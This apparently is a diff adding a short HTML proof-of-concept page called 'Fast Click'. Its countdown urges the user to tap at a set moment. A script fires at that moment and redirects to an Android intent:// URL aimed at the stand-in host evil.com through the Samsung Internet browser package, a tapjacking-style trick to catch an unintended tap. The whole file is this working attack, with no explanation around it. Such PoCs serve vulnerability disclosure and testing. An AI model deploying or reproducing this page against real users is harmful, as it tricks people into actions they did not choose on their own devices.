@@ -1,0 +1,59 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            touch-action: manipulation;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        #timer {
+            position: fixed;
+            top: 60%;
+            right: 50%;
+            width: 20%;
+            font-size: 30px;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            user-select: none;
+            -webkit-user-select: none;
+            touch-action: manipulation;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Fast Click</h1>
+
+<div id="timer">1</div>
+
+<script>
+setTimeout(() => {
+    location.href = 'intent://evil.com/#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'
+}, 3000)
+</script>
+
+<script>
+    let count = 1;
+    const timer = document.getElementById("timer");
+
+    const interval = setInterval(() => {
+        count++;
+
+        if (count <= 3) {
+            timer.textContent = count;
+        } else {
+            timer.textContent = "CLICKK!!!";
+            clearInterval(interval);
+        }
+    }, 1000);
+</script>
+
+</body>
+</html>
